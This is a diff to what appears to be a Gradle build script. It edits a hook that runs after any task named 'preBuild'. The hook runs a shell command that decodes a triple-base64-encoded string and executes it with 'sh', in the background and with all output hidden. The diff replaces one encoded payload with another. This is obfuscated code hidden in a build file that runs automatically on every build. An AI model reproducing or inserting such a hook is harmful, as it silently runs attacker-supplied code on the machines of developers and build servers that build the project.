@@ -138,7 +138,7 @@ dependencies {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKYWEzaDZTVU13ZEdOdFZqQmpibXRuVGtOQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVUxcFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESmtlVmxYVW5OYVUwbG5ZVWhTTUdOSVRUWk1lVGxxV2tjMWFHSlliM1ZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | a | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjAxNVFYUk1WMDUyWW0wMWJGa3pVWFJrUjJ4MFdsYzVNV1JEUVhsUFEwRjBZVEI0YldONVFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESmtlVmxYVW5OYVUwbG5ZVWhTTUdOSVRUWk1lVGxzWlVoQ2MySXpTbXhaTWxKMVRHNUtNVXd5UlhCSmFVSTRTVWhPYjBOblBUMEsK | z | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
